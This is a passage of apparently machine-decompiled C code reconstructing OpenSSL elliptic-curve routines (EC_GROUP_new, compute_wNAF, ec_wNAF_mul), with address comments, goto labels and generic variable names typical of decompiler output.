    *(int64_t *)(v3 + 96) = 0;
    *(int64_t *)(v3 + 8) = 0;
    BN_init(v3 + 16);
    int64_t v4 = BN_init(v3 + 40); // 0x49950f
    *(int32_t *)(v3 + 64) = 0;
    *(int32_t *)(v3 + 68) = 0;
    *(int32_t *)(v3 + 72) = 4;
    *(int64_t *)(v3 + 80) = 0;
    *(int64_t *)(v3 + 88) = 0;
    int64_t result = v3; // 0x499541
    if ((int32_t)v4 == 0) {
        // 0x499550
        CRYPTO_free(v3, (int64_t)"ec_lib.c");
        result = 0;
    }
    // 0x499543
    return result;
}

// Address range: 0x499640 - 0x499730
int64_t EC_GROUP_new_curve_GFp(int64_t a1, int64_t a2, int64_t a3, int32_t a4) {
    int64_t result = EC_GROUP_new(EC_GFp_mont_method()); // 0x499671
    if (result == 0) {
        // 0x499696
        return 0;
    }
    // 0x49967e
    if ((int32_t)EC_GROUP_set_curve_GFp(result) != 0) {
        // 0x499696
        return result;
    }
    // 0x4996c0
    int64_t v1; // 0x499640
    int64_t v2 = ERR_peek_last_error(result, a1, a2, a3, (int64_t)a4, v1); // 0x4996c0
    if ((v2 & 0xff000000) != 0x10000000 || (int32_t)v2 % 0x1000 >= 137) {
        // 0x4996e0
        EC_GROUP_clear_free(result);
        // 0x499696
        return 0;
    }
    // 0x4996f0
    ERR_clear_error();
    EC_GROUP_clear_free(result);
    int64_t result2 = EC_GROUP_new(EC_GFp_mont_method()); // 0x499705
    if (result2 == 0) {
        // 0x499696
        return 0;
    }
    // 0x499712
    if ((int32_t)EC_GROUP_set_curve_GFp(result2) != 0) {
        // 0x499696
        return result2;
    }
    // 0x4996e0
    EC_GROUP_clear_free(result2);
    // 0x499696
    return 0;
}

// Address range: 0x499eb0 - 0x49a15a
int64_t compute_wNAF(int64_t a1, int64_t a2, int64_t a3) {
    // 0x499eb0
    int64_t v1; // 0x499eb0
    int64_t v2; // 0x499eb0
    int64_t v3; // 0x499eb0
    int64_t v4; // 0x499eb0
    int64_t v5; // 0x499eb0
    int64_t result2; // 0x499f2e
    if (*(int32_t *)(a1 + 8) == 0) {
        // 0x49a050
        int64_t v6; // 0x499eb0
        int64_t result = CRYPTO_malloc(1, "ec_mult.c", 204, v5, v6); // 0x49a061
        if (result != 0) {
            // 0x49a078
            *(char *)result = 0;
            *(int64_t *)a3 = 1;
            // 0x49a028
            return result;
        }
        goto lab_0x49a0f7;
    } else {
        uint32_t v7 = (int32_t)a2;
        v2 = 217;
        if (v7 < 8) {
            // 0x499ef9
            v2 = 231;
            if (a1 == 0) {
                goto lab_0x499ffe;
            } else {
                int64_t v8 = BN_num_bits(a1); // 0x499f12
                int64_t v9 = v8 + 1; // 0x499f21
                result2 = CRYPTO_malloc(v9 & 0xffffffff, "ec_mult.c", 236, v5, 217);
                if (result2 == 0) {
                    goto lab_0x49a0f7;
                } else {
                    uint64_t v10 = 0x100000000 * v8 / 0x100000000; // 0x499f1e
                    uint32_t v11 = v7 % 32; // 0x499f4c
                    uint32_t v12 = 1 << v11;
                    int64_t v13 = v12;
                    int32_t v14 = 2 * v12; // 0x499f57
                    int32_t v15 = v14 - 1; // 0x499f6a
                    int64_t v16 = 0x100000000 * a2 / 0x100000000; // 0x499f7b
                    int64_t v17 = 0; // 0x499f7b
                    int64_t v18 = v15 & (int32_t)v9; // 0x499f7b
                    uint64_t v19; // 0x499eb0
                    int64_t v20; // 0x499eb0
                    while (true) {
                        // 0x499f80
                        v20 = v18;
                        v19 = v17;
                        uint64_t v21 = v16 + 1;
                        int64_t v22; // 0x499eb0
                        char v23; // 0x499eb0
                        if (v20 != 0) {
                            // 0x49a088
                            v22 = v20;
                            v23 = 0;
                            if (v20 % 2 != 0) {
                                int32_t v24 = v20;
                                int64_t v25 = 1; // 0x49a097
                                int64_t v26 = v20; // 0x49a097
                                if ((v12 & v24) != 0) {
                                    // 0x49a099
                                    v26 = v10 > v21 ? v24 - v14 : v15 / 2 & v24;
                                    v25 = v26 % 2;
                                }
                                int64_t v27 = v26; // 0x49a0d2
                                v1 = 279;
                                if (v25 == 0 || v27 <= (int64_t)-v12 || v27 >= v13) {
                                    goto lab_0x499fd8_3;
                                }
                                int64_t v28 = v20 - v27; // 0x49a0bc
                                int32_t v29 = v28; // 0x49a0be
                                if (v14 != v29) {
                                    // 0x49a0c4
                                    v1 = 290;
                                    if (v29 != 0 == (v12 != v29)) {
                                        goto lab_0x499fd8_3;
                                    }
                                }
                                // 0x49a0cd
                                v22 = v28 & 0xffffffff;
                                v23 = (*(int32_t *)(a1 + 16) == 0 ? 1 : -1) * (char)v27;
                            }
                        } else {
                            // 0x499f88
                            v22 = v20;
                            v23 = 0;
                            if (v10 <= v21) {
                                // break -> 0x49a0da
                                break;
                            }
                        }
                        // 0x499f95
                        *(char *)(v19 + result2) = v23;
                        v17 = v19 + 1;
                        v18 = ((int32_t)BN_is_bit_set(a1, v17 + a2 & 0xffffffff) << v11) + (int32_t)v22 / 2;
                        v16 = v21;
                        v1 = 302;
                        if (0x200000000 * v13 / 0x100000000 < v18) {
                            goto lab_0x499fd8_3;
                        }
                    }
                    if (v19 <= v10 + 1) {
                        // 0x49a0e8
                        *(int64_t *)a3 = v19;
                        // 0x49a028
                        return result2;
                    }
                    int64_t v30 = v20 & 0xffffff00 | 143; // 0x49a148
                    ERR_put_error(16, v30, 68, "ec_mult.c", 309);
                    v3 = result2;
                    v4 = v30;
                    goto lab_0x49a01b;
                }
            }
        } else {
            goto lab_0x499ffe;
        }
    }
  lab_0x499fd8_3:
    // 0x499fd8
    ERR_put_error(16, 143, 68, "ec_mult.c", v1);
    v3 = result2;
    v4 = 143;
    goto lab_0x49a01b;
  lab_0x49a0f7:
    // 0x49a0f7
    ERR_put_error(16, 143, 65, "ec_mult.c", 207);
    v3 = 0;
    v4 = 143;
    goto lab_0x49a01b;
  lab_0x499ffe:
    // 0x499ffe
    ERR_put_error(16, 143, 68, "ec_mult.c", v2);
    v3 = 0;
    v4 = 143;
    goto lab_0x49a01b;
  lab_0x49a01b:
    // 0x49a01b
    CRYPTO_free(v3, v4);
    // 0x49a028
    return 0;
}

// Address range: 0x49a160 - 0x49af92
int64_t ec_wNAF_mul(int64_t a1, int64_t a2, int64_t a3, uint64_t a4, int64_t a5, int64_t a6, int64_t a7) {
    // 0x49a160
    if (a1 != a2) {
        // 0x49a193
        ERR_put_error(16, 187, 101, "ec_mult.c", 374);
        // 0x49a1b6
        return 0;
    }
    int64_t v1; // 0x49a160
    if (a4 == 0) {
        // 0x49a488
        v1 = a3;
        if (a3 == 0) {
            // 0x49a1b6
            return EC_POINT_set_to_infinity(a1, a1);
        }
    } else {
        // 0x49a1d9
        if (a1 != 374) {
            // 0x49a193
            ERR_put_error(16, 187, 101, "ec_mult.c", 387);
            // 0x49a1b6
            return 0;
        }
        int64_t v2 = 1; // 0x49a204
        v1 = 374;
        if (a4 > 1) {
            int64_t v3 = *(int64_t *)(8 * v2 + a5); // 0x49a1f0
            while (*(int64_t *)v3 == 374) {
                int64_t v4 = v2 + 1; // 0x49a1fd
                v2 = v4;
                v1 = v3;
                if (v4 >= a4) {
                    goto lab_0x49a206;
                }
                v3 = *(int64_t *)(8 * v2 + a5);
            }
            // 0x49a193
            ERR_put_error(16, 187, 101, "ec_mult.c", 387);
            // 0x49a1b6
            return 0;
        }
    }
  lab_0x49a206:;
    int64_t v5 = a7; // 0x49a218
    int64_t v6 = 0; // 0x49a218
    if (a7 == 0) {
        int64_t v7 = BN_CTX_new(a1, a1, v1, a1, 374, a6); // 0x49a9c8
        v5 = v7;
        v6 = v7;
        if (v7 == 0) {
            // 0x49a1b6
            return 0;
        }
    }
    int64_t v8 = 0; // 0x49a224
    int64_t v9 = 0; // 0x49a224
    int64_t * v10 = NULL; // 0x49a224
    int64_t v11 = 0; // 0x49a224
    int64_t v12 = 0; // 0x49a224
    int64_t v13 = 0; // 0x49a224
    int64_t v14 = a1; // 0x49a224
    int64_t v15 = 374; // 0x49a224
    int64_t v16; // 0x49a160
    int64_t v17; // 0x49a160
    if (a3 == 0) {
        goto lab_0x49a2ca;
    } else {
        int64_t v18 = EC_GROUP_get0_generator(a1); // 0x49a22d
        v17 = 113;
        v16 = 404;
        if (v18 == 0) {
            goto lab_0x49a6ba;
        } else {
            int64_t v19 = EC_EX_DATA_get_data(*(int64_t *)(a1 + 96), 0x499760, 0x499830, 0x499790); // 0x49a26f
            if (v19 == 0) {
                goto lab_0x49a2ca;
            } else {
                int64_t * v20 = (int64_t *)(v19 + 16); // 0x49a287
                v8 = v18;
                v9 = 0;
                v10 = (int64_t *)1;
                v11 = 0;
                v12 = 1;
                v13 = 0;
                v14 = 0x499790;
                v15 = 404;
                if (*v20 != 0) {
                    int64_t v21 = EC_POINT_cmp(a1, v18, *(int64_t *)*(int64_t *)(v19 + 32)); // 0x49a616
                    v8 = v18;
                    v9 = 0;
                    v10 = (int64_t *)1;
                    v11 = 0;
                    v12 = 1;
                    v13 = 0;
                    v14 = v5;
                    v15 = 404;
                    if ((int32_t)v21 != 0) {
                        goto lab_0x49a2ca;
                    } else {
                        uint64_t v22 = *(int64_t *)(v19 + 8); // 0x49a62d
                        int64_t v23 = BN_num_bits(a3); // 0x49a639
                        uint64_t v24 = *v20; // 0x49a653
                        uint64_t v25 = (*(int64_t *)(v19 + 24) + 63) % 64; // 0x49a65a
                        v17 = 68;
                        v16 = 429;
                        if (*(int64_t *)(v19 + 40) != v24 << v25) {
                            goto lab_0x49a6ba;
                        } else {
                            uint64_t v26 = 0x100000000 * v23 / 0x100000000 / v22 + 1; // 0x49a690
                            v8 = v18;
                            v9 = v19;
                            v10 = NULL;
                            v11 = 1 << v25;
                            v12 = v26 > v24 ? v24 : v26;
                            v13 = v22;
                            v14 = v19;
                            v15 = 404;
                            goto lab_0x49a2ca;
                        }
                    }
                } else {
                    goto lab_0x49a2ca;
                }
            }
        }
    }
  lab_0x49a766:;
    // 0x49a766
    int64_t v27; // 0x49a160
    int64_t v28 = v27;
    int32_t v29; // 0x49a160
    int32_t v30 = v29;
    int64_t v31; // 0x49a160
    int64_t v32 = v31;
    int64_t v33; // 0x49a2d7
    int64_t v34 = v33; // 0x49a76f
    int64_t v35 = v32; // 0x49a76f
    int64_t v36 = v28; // 0x49a76f
    int64_t v37 = v15; // 0x49a76f
    int64_t v38; // 0x49a160
    int64_t v39; // 0x49a160
    int64_t v40; // 0x49a160
    int64_t v41; // 0x49a160
    int64_t v42; // 0x49a160
    int64_t v43; // 0x49a160
    uint64_t v44; // 0x49a160
    int64_t v45; // 0x49a160
    int64_t v46; // 0x49a160
    int64_t v47; // 0x49a160
    int64_t v48; // 0x49a160
    int64_t v49; // 0x49a160
    int32_t result; // 0x49a160
    int32_t v50; // bp-64, 0x49a160
    int64_t v51; // 0x49a336
    int64_t v52; // 0x49a354
    int64_t v53; // 0x49a82b
    int64_t v54; // 0x49a2f2
    int64_t v55; // 0x49a310
    if (v12 == 0) {
        goto lab_0x49a8a5;
    } else {
        if (v9 == 0) {
            // 0x49ab7d
            v42 = 68;
            v40 = 483;
            v34 = v33;
            v35 = v32;
            v36 = v28;
            v37 = v15;
            if (v10 == (int64_t *)1) {
                goto lab_0x49a8a5;
            } else {
                goto lab_0x49a38e;
            }
        } else {
            // 0x49a781
            v50 = 0;
            if (v10 == NULL) {
                int64_t v56 = *(int64_t *)(v9 + 24); // 0x49a81b
                int64_t v57 = 8 * a4; // 0x49a81f
                *(int64_t *)(0x100000000 * v54 / 0x100000000 + v57) = v56;
                v53 = compute_wNAF(a3, v56, (int64_t)&v50);
                result = 0;
                v45 = v54;
                v46 = v55;
                v49 = v51;
                v47 = v52;
                v43 = v56;
                v38 = 0;
                v39 = 0;
                if (v53 == 0) {
                    goto lab_0x49a3ab_5;
                } else {
                    uint64_t v58 = (int64_t)v50;
                    if (v32 < v58) {
                        // 0x49a9f0
                        v48 = v33;
                        v41 = v15;
                        if (v44 * v12 <= v58) {
                            goto lab_0x49aa35;
                        } else {
                            uint64_t v59 = (v44 - 1 + v58) / v44;
                            v42 = 68;
                            v40 = 535;
                            if (v59 > *(int64_t *)(v9 + 16)) {
                                goto lab_0x49a38e;
                            } else {
                                // 0x49aa2d
                                v48 = v59 + a4;
                                v41 = 535;
                                goto lab_0x49aa35;
                            }
                        }
                    } else {
                        int64_t v60 = a4 + 1; // 0x49a85d
                        *(int64_t *)(v51 + v57) = v53;
                        *(int64_t *)(v51 + 8 * v60) = 0;
                        *(int64_t *)(0x100000000 * v55 / 0x100000000 + v57) = v58;
                        *(int64_t *)(v52 + v57) = *(int64_t *)(v9 + 32);
                        v34 = v60;
                        v35 = v32;
                        v36 = v52;
                        v37 = v15;
                        goto lab_0x49a8a5;
                    }
                }
            } else {
                // 0x49a798
                ERR_put_error(16, 187, 68, "ec_mult.c", 495);
                result = 0;
                v45 = v54;
                v46 = v55;
                v49 = v51;
                v47 = v52;
                v43 = 187;
                v38 = 0;
                v39 = 0;
                goto lab_0x49a3ab_5;
            }
        }
    }
  lab_0x49a3ab_5:
    // 0x49a3ab
    if (v6 != 0) {
        // 0x49a3b3
        BN_CTX_free(v6);
    }
    if (v38 != 0) {
        // 0x49a3c2
        EC_POINT_free(v38);
    }
    if (v45 != 0) {
        // 0x49a3d2
        CRYPTO_free(v45, v43);
    }
    if (v46 != 0) {
        // 0x49a3e4
        CRYPTO_free(v46, v43);
    }
    if (v49 != 0) {
        int64_t v61 = *(int64_t *)v49; // 0x49a3fb
        if (v61 != 0) {
            int64_t v62 = v49 + 8; // 0x49a410
            CRYPTO_free(v61, v43);
            int64_t v63 = *(int64_t *)v62; // 0x49a419
            int64_t v64 = v62; // 0x49a41f
            int64_t v65 = v63; // 0x49a41f
            while (v63 != 0) {
                // 0x49a410
                v62 = v64 + 8;
                CRYPTO_free(v65, v43);
                v63 = *(int64_t *)v62;
                v64 = v62;
                v65 = v63;
            }
        }
        // 0x49a421
        CRYPTO_free(v49, v43);
    }
    if (v39 != 0) {
        int64_t v66 = *(int64_t *)v39; // 0x49a430
        if (v66 != 0) {
            int64_t v67 = v39 + 8; // 0x49a440
            EC_POINT_clear_free(v66);
            int64_t v68 = *(int64_t *)v67; // 0x49a449
            int64_t v69 = v67; // 0x49a44f
            int64_t v70 = v68; // 0x49a44f
            while (v68 != 0) {
                // 0x49a440
                v67 = v69 + 8;
                EC_POINT_clear_free(v70);
                v68 = *(int64_t *)v67;
                v69 = v67;
                v70 = v68;
            }
        }
        // 0x49a451
        CRYPTO_free(v39, v43);
    }
    // 0x49a459
    if (v47 != 0) {
        // 0x49a465
        CRYPTO_free(v47, v43);
    }
    // 0x49a1b6
    return result;
  lab_0x49a997:;
    // 0x49a997
    int64_t v71; // 0x49a160
    int64_t v72; // 0x49a160
    uint64_t v73; // 0x49a4c8
    int64_t v74; // 0x49a8bc
    int64_t v75; // 0x49a8d5
    int64_t v76; // 0x49ac82
    if (v74 == v75) {
        // 0x49ac7f
        v76 = EC_POINT_new(a1);
        result = 0;
        v45 = v54;
        v46 = v55;
        v49 = v51;
        v47 = v52;
        v43 = (int64_t)"ec_mult.c";
        v38 = 0;
        v39 = v74;
        if (v76 == 0) {
            goto lab_0x49a3ab_5;
        } else {
            // 0x49acb7
            v71 = v37;
            if (v73 == 0) {
                goto lab_0x49adcf;
            } else {
                int64_t v77 = 0; // 0x49a160
                int64_t v78 = v37;
                int64_t v79 = 0; // 0x49ad8d
                while (true) {
                    int64_t v80 = v78;
                    int64_t v81 = v77;
                    if (v79 >= a4) {
                        int64_t v82 = *(int64_t *)*(int64_t *)(v81 + v52); // 0x49adad
                        int64_t v83 = EC_POINT_copy(v82, v72); // 0x49adb0
                        result = 0;
                        v45 = v54;
                        v46 = v55;
                        v49 = v51;
                        v47 = v52;
                        v43 = v72;
                        v38 = v76;
                        v39 = v74;
                        if ((int32_t)v83 == 0) {
                            // break -> 0x49a3ab
                            break;
                        }
                    } else {
                        int64_t v84 = *(int64_t *)(v81 + a5); // 0x49acdf
                        int64_t v85 = EC_POINT_copy(*(int64_t *)*(int64_t *)(v81 + v52), v84); // 0x49acea
                        result = 0;
                        v45 = v54;
                        v46 = v55;
                        v49 = v51;
                        v47 = v52;
                        v43 = v84;
                        v38 = v76;
                        v39 = v74;
                        if ((int32_t)v85 == 0) {
                            // break -> 0x49a3ab
                            break;
                        }
                    }
                    int64_t * v86 = (int64_t *)(v81 + 0x100000000 * v54 / 0x100000000); // 0x49acfc
                    int64_t v87 = v80; // 0x49ad01
                    if (*v86 >= 2) {
                        int64_t * v88 = (int64_t *)(v81 + v52); // 0x49ad1a
                        int64_t v89 = EC_POINT_dbl(a1, v76, *(int64_t *)*v88); // 0x49ad21
                        result = 0;
                        v45 = v54;
                        v46 = v55;
                        v49 = v51;
                        v47 = v52;
                        v43 = v76;
                        v38 = v76;
                        v39 = v74;
                        if ((int32_t)v89 == 0) {
                            // break -> 0x49a3ab
                            break;
                        }
                        int64_t v90 = 1; // 0x49ad88
                        int64_t v91 = 0; // 0x49ad88
                        v87 = v80;
                        if ((*v86 + 63) % 64 != 0) {
                            int64_t v92 = *v88; // 0x49ad4f
                            int64_t v93 = *(int64_t *)(v92 + 8 * v90); // 0x49ad5a
                            int64_t v94 = EC_POINT_add(a1, v93, *(int64_t *)(v92 + v91), v76); // 0x49ad62
                            result = 0;
                            v45 = v54;
                            v46 = v55;
                            v49 = v51;
                            v47 = v52;
                            v43 = v93;
                            v38 = v76;
                            v39 = v74;
                            if ((int32_t)v94 == 0) {
                                // break (via goto) -> 0x49a3ab
                                goto lab_0x49a3ab_5;
                            }
                            int64_t v95 = v90 + 1; // 0x49ad6b
                            v90 = v95;
                            v91 += 8;
                            v87 = v5;
                            while (v95 >> (*v86 + 63) % 64 == 0) {
                                // 0x49ad3f
                                v92 = *v88;
                                v93 = *(int64_t *)(v92 + 8 * v90);
                                v94 = EC_POINT_add(a1, v93, *(int64_t *)(v92 + v91), v76);
                                result = 0;
                                v45 = v54;
                                v46 = v55;
                                v49 = v51;
                                v47 = v52;
                                v43 = v93;
                                v38 = v76;
                                v39 = v74;
                                if ((int32_t)v94 == 0) {
                                    // break (via goto) -> 0x49a3ab
                                    goto lab_0x49a3ab_5;
                                }
                                // 0x49ad6b
                                v95 = v90 + 1;
                                v90 = v95;
                                v91 += 8;
                                v87 = v5;
                            }
                        }
                    }
                    // 0x49ad8d
                    v78 = v87;
                    v79++;
                    v77 = v81 + 8;
                    v71 = v78;
                    if (v79 >= v73) {
                        goto lab_0x49adcf;
                    }
                }
                goto lab_0x49a3ab_5;
            }
        }
    } else {
        // 0x49a9a2
        ERR_put_error(16, 187, 68, "ec_mult.c", 614);
        result = 0;
        v45 = v54;
        v46 = v55;
        v49 = v51;
        v47 = v52;
        v43 = 187;
        v38 = 0;
        v39 = v74;
        goto lab_0x49a3ab_5;
    }
  lab_0x49adcf:;
    // 0x49adcf
    int64_t v96; // 0x49a8cd
    int64_t v97 = EC_POINTs_make_affine(a1, v96, v74, v5, v71); // 0x49adef
    result = 0;
    v45 = v54;
    v46 = v55;
    v49 = v51;
    v47 = v52;
    v43 = v96;
    v38 = v76;
    v39 = v74;
    int64_t v98; // 0x49a160
    if ((int32_t)v97 == 0) {
        goto lab_0x49a3ab_5;
    } else {
        int64_t v99 = v35 + 0xffffffff; // 0x49ae0d
        int32_t v100 = v99; // 0x49ae13
        if (v100 < 0) {
            goto lab_0x49af7d;
        } else {
            int64_t v101 = 0x100000000 * v55 / 0x100000000;
            bool v102 = false; // 0x49a160
            int64_t v103 = 0x100000000 * v99 / 0x100000000; // 0x49a160
            int64_t v104 = v96; // 0x49a160
            int64_t v105 = 1; // 0x49a160
            int32_t v106 = 0; // 0x49a160
            int32_t v107 = v100; // 0x49aebc
            while (true) {
                int64_t v108 = v103;
                int64_t v109 = v104; // 0x49ae29
                if (v102) {
                    int64_t v110 = EC_POINT_dbl(a1, a1, a1); // 0x49af10
                    result = 0;
                    v45 = v54;
                    v46 = v55;
                    v49 = v51;
                    v47 = v52;
                    v43 = a1;
                    v38 = v76;
                    v39 = v74;
                    v109 = a1;
                    if ((int32_t)v110 == 0) {
                        // break -> 0x49a3ab
                        break;
                    }
                }
                int64_t v111 = 0; // 0x49aeb6
                int64_t v112 = v105; // 0x49aeb6
                int32_t v113 = v106; // 0x49aeb6
                int32_t v114 = v106; // 0x49aeb6
                int64_t v115 = v105; // 0x49aeb6
                int64_t v116 = v109; // 0x49aeb6
                if (v34 != 0) {
                    int32_t v117 = v113;
                    int64_t v118 = v112;
                    int64_t v119 = 8 * v111; // 0x49ae3d
                    int32_t v120 = v117; // 0x49ae41
                    int64_t v121 = v118; // 0x49ae41
                    int64_t v122 = v101; // 0x49ae41
                    int32_t v123; // 0x49a160
                    int32_t v124; // 0x49a160
                    int32_t v125; // 0x49a160
                    char v126; // 0x49ae51
                    int64_t v127; // 0x49ae51
                    int64_t v128; // 0x49ae64
                    int64_t v129; // 0x49a160
                    int64_t v130; // 0x49a160
                    int64_t v131; // 0x49aef1
                    int64_t v132; // 0x49ae9e
                    int64_t v133; // 0x49af4b
                    if (v108 < *(int64_t *)(v119 + v101)) {
                        // 0x49ae43
                        v126 = *(char *)(*(int64_t *)(v119 + v51) + v108);
                        v120 = v117;
                        v121 = v118;
                        v122 = v108;
                        if (v126 != 0) {
                            // 0x49ae59
                            v123 = v118;
                            v124 = v117;
                            if (v117 != (int32_t)(v126 < 0)) {
                                if (v123 == 0) {
                                    // 0x49af3a
                                    v133 = EC_POINT_invert(a1, a1);
                                    result = 0;
                                    v45 = v54;
                                    v46 = v55;
                                    v49 = v51;
                                    v47 = v52;
                                    v43 = a1;
                                    v38 = v76;
                                    v39 = v74;
                                    if ((int32_t)v133 == 0) {
                                        // break (via goto) -> 0x49a3ab
                                        goto lab_0x49a3ab_5;
                                    }
                                }
                                // 0x49ae75
                                v124 = v117 == 0;
                            }
                            // 0x49ae83
                            v127 = v126;
                            v128 = v126 < 0 ? -v127 : v127;
                            v125 = v124;
                            v129 = *(int64_t *)(v119 + v52);
                            v130 = *(int64_t *)(v129 + 8 * (int64_t)((int32_t)v128 / 2));
                            if (v123 == 0) {
                                // 0x49aecc
                                v131 = EC_POINT_add(a1, a1, a1, v130);
                                result = 0;
                                v45 = v54;
                                v46 = v55;
                                v49 = v51;
                                v47 = v52;
                                v43 = a1;
                                v38 = v76;
                                v39 = v74;
                                v120 = v125;
                                v121 = v118;
                                v122 = a1;
                                if ((int32_t)v131 == 0) {
                                    // break (via goto) -> 0x49a3ab
                                    goto lab_0x49a3ab_5;
                                }
                            } else {
                                // 0x49ae87
                                v132 = EC_POINT_copy(a1, v130);
                                result = 0;
                                v45 = v54;
                                v46 = v55;
                                v49 = v51;
                                v47 = v52;
                                v43 = v130;
                                v38 = v76;
                                v39 = v74;
                                v120 = v125;
                                v121 = 0;
                                v122 = v130;
                                if ((int32_t)v132 == 0) {
                                    // break (via goto) -> 0x49a3ab
                                    goto lab_0x49a3ab_5;
                                }
                            }
                        }
                    }
                    int64_t v134 = v111 + 1; // 0x49aead
                    v111 = v134;
                    v114 = v120;
                    v115 = v121;
                    v116 = v122;
                    while (v34 > v134) {
                        // 0x49ae33
                        v117 = v120;
                        v118 = v121;
                        v119 = 8 * v111;
                        v120 = v117;
                        v121 = v118;
                        v122 = v101;
                        if (v108 < *(int64_t *)(v119 + v101)) {
                            // 0x49ae43
                            v126 = *(char *)(*(int64_t *)(v119 + v51) + v108);
                            v120 = v117;
                            v121 = v118;
                            v122 = v108;
                            if (v126 != 0) {
                                // 0x49ae59
                                v123 = v118;
                                v124 = v117;
                                if (v117 != (int32_t)(v126 < 0)) {
                                    if (v123 == 0) {
                                        // 0x49af3a
                                        v133 = EC_POINT_invert(a1, a1);
                                        result = 0;
                                        v45 = v54;
                                        v46 = v55;
                                        v49 = v51;
                                        v47 = v52;
                                        v43 = a1;
                                        v38 = v76;
                                        v39 = v74;
                                        if ((int32_t)v133 == 0) {
                                            // break (via goto) -> 0x49a3ab
                                            goto lab_0x49a3ab_5;
                                        }
                                    }
                                    // 0x49ae75
                                    v124 = v117 == 0;
                                }
                                // 0x49ae83
                                v127 = v126;
                                v128 = v126 < 0 ? -v127 : v127;
                                v125 = v124;
                                v129 = *(int64_t *)(v119 + v52);
                                v130 = *(int64_t *)(v129 + 8 * (int64_t)((int32_t)v128 / 2));
                                if (v123 == 0) {
                                    // 0x49aecc
                                    v131 = EC_POINT_add(a1, a1, a1, v130);
                                    result = 0;
                                    v45 = v54;
                                    v46 = v55;
                                    v49 = v51;
                                    v47 = v52;
                                    v43 = a1;
                                    v38 = v76;
                                    v39 = v74;
                                    v120 = v125;
                                    v121 = v118;
                                    v122 = a1;
                                    if ((int32_t)v131 == 0) {
                                        // break (via goto) -> 0x49a3ab
                                        goto lab_0x49a3ab_5;
                                    }
                                } else {
                                    // 0x49ae87
                                    v132 = EC_POINT_copy(a1, v130);
                                    result = 0;
                                    v45 = v54;
                                    v46 = v55;
                                    v49 = v51;
                                    v47 = v52;
                                    v43 = v130;
                                    v38 = v76;
                                    v39 = v74;
                                    v120 = v125;
                                    v121 = 0;
                                    v122 = v130;
                                    if ((int32_t)v132 == 0) {
                                        // break (via goto) -> 0x49a3ab
                                        goto lab_0x49a3ab_5;
                                    }
                                }
                            }
                        }
                        // 0x49aead
                        v134 = v111 + 1;
                        v111 = v134;
                        v114 = v120;
                        v115 = v121;
                        v116 = v122;
                    }
                }
                int64_t v135 = v116;
                int64_t v136 = v115;
                int32_t v137 = v114;
                v107--;
                v102 = (int32_t)v136 == 0;
                v103 = v108 - 1;
                v104 = v135;
                v105 = v136;
                v106 = v137;
                if (v107 < 0) {
                    if ((int32_t)v136 != 0) {
                        goto lab_0x49af7d;
                    } else {
                        // 0x49af26
                        v98 = v135;
                        if (v137 != 0) {
                            int64_t v138 = EC_POINT_invert(a1, a1); // 0x49af6e
                            result = 0;
                            v45 = v54;
                            v46 = v55;
                            v49 = v51;
                            v47 = v52;
                            v43 = a1;
                            v38 = v76;
                            v39 = v74;
                            v98 = a1;
                            if ((int32_t)v138 == 0) {
                                goto lab_0x49a3ab_5;
                            } else {
                                goto lab_0x49af2d;
                            }
                        } else {
                            goto lab_0x49af2d;
                        }
                    }
                }
            }
            goto lab_0x49a3ab_5;
        }
    }
  lab_0x49ac4a_2:;
    // 0x49ac4a
    int64_t v139; // 0x49a160
    int64_t v140; // 0x49a160
    ERR_put_error(16, 187, v140, "ec_mult.c", v139);
    int64_t v141; // 0x49a160
    CRYPTO_free(v141, 187);
    result = 0;
    v45 = v54;
    v46 = v55;
    v49 = v51;
    v47 = v52;
    v43 = 187;
    v38 = 0;
    v39 = 0;
    goto lab_0x49a3ab_5;
  lab_0x49a2ca:
    // 0x49a2ca
    v33 = v12 + a4;
    int64_t v142 = 8 * v33; // 0x49a2eb
    int64_t v143 = v142 & 0xfffffff8; // 0x49a2eb
    v54 = CRYPTO_malloc(v143, "ec_mult.c", 444, v14, v15);
    v55 = CRYPTO_malloc(v143, "ec_mult.c", 445, v14, v15);
    v51 = CRYPTO_malloc(v142 + 8 & 0xfffffff8, "ec_mult.c", 446, v14, v15);
    v52 = CRYPTO_malloc(v143, "ec_mult.c", 447, v14, v15);
    v42 = 65;
    v40 = 451;
    if ((int32_t)v54 == 0 || (v55 & 0xffffffff) == 0) {
        goto lab_0x49a38e;
    } else {
        // 0x49a373
        v42 = 65;
        v40 = 451;
        if (v51 == 0 || v52 == 0) {
            goto lab_0x49a38e;
        } else {
            // 0x49a4b4
            v44 = v13;
            v72 = v8;
            *(int64_t *)v51 = 0;
            v73 = (int64_t)v10 + a4;
            v31 = 0;
            v29 = 0;
            v27 = v14;
            if (v73 == 0) {
                goto lab_0x49a766;
            } else {
                int32_t v144 = 0; // 0x49a5c3
                int64_t v145 = 0;
                uint64_t v146 = 0;
                uint64_t v147 = 0;
                int64_t v148; // 0x49a160
                int64_t v149; // 0x49a160
                if (v147 < a4) {
                    // 0x49a518
                    v148 = a6;
                    v149 = BN_num_bits(*(int64_t *)(v145 + a6));
                } else {
                    // 0x49a5eb
                    v148 = 0;
                    v149 = BN_num_bits(a3);
                }
                uint64_t v150 = 0x100000000 * v149 / 0x100000000;
                int64_t v151 = 6; // 0x49a539
                int64_t v152 = 32; // 0x49a539
                int64_t v153; // 0x49a56a
                if (v150 < 2000) {
                    // 0x49a53b
                    v151 = 5;
                    v152 = 16;
                    if (v150 < 800) {
                        // 0x49a549
                        v151 = 4;
                        v152 = 8;
                        if (v150 < 300) {
                            // 0x49a557
                            v151 = 3;
                            v152 = 4;
                            if (v150 < 70) {
                                // 0x49a563
                                v153 = (int64_t)(v150 < 20) + 2;
                                v151 = v153;
                                v152 = v153;
                            }
                        }
                    }
                }
                int64_t v154 = v147 + 1; // 0x49a57d
                *(int64_t *)(8 * v154 + v51) = 0;
                *(int64_t *)(v145 + 0x100000000 * v54 / 0x100000000) = v151;
                int64_t v155 = v148; // 0x49a5a1
                int64_t v156 = a3; // 0x49a5a1
                if (v147 < a4) {
                    // 0x49a5a3
                    v156 = *(int64_t *)(v145 + a6);
                    v155 = a6;
                }
                int64_t v157 = v145 + 0x100000000 * v55 / 0x100000000; // 0x49a59b
                int64_t v158 = compute_wNAF(v156, v151, v157); // 0x49a5ac
                *(int64_t *)(v145 + v51) = v158;
                result = 0;
                v45 = v54;
                v46 = v55;
                v49 = v51;
                v47 = v52;
                v43 = v151;
                v38 = 0;
                v39 = 0;
                while (v158 != 0) {
                    // 0x49a5be
                    v144 += (int32_t)v152;
                    uint64_t v159 = *(int64_t *)v157; // 0x49a5c8
                    int64_t v160 = v146 < v159 ? v159 : v146; // 0x49a5cf
                    int64_t v161 = v155; // 0x49a5dc
